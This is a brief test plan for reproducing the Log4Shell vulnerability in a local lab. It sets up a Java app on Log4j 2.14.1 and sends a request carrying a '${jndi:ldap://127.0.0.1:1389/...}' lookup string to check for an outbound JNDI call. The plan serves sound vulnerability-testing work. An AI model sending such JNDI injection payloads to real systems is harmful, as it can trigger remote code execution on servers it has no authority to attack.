## Use case

The Log4Shell vulnerability allows attacker-controlled input to trigger JNDI lookups in vulnerable Log4j configurations, potentially leading to remote code execution. This is critical as it can enable attackers to execute arbitrary code on the server.

## Steps to test

1. Create a Maven project with a vulnerable Log4j version (2.14.1).
2. Implement a simple Java application that logs HTTP requests using Log4j.
3. Start the application and listen for incoming requests on port 8080.
4. Send a normal request using curl to verify logging behavior: curl http://localhost:8080/test.
5. Send a malicious request to test for Log4Shell behavior: curl 'http://localhost:8080/${jndi:ldap://127.0.0.1:1389/test}'.
6. Observe if the application attempts an outbound JNDI lookup.
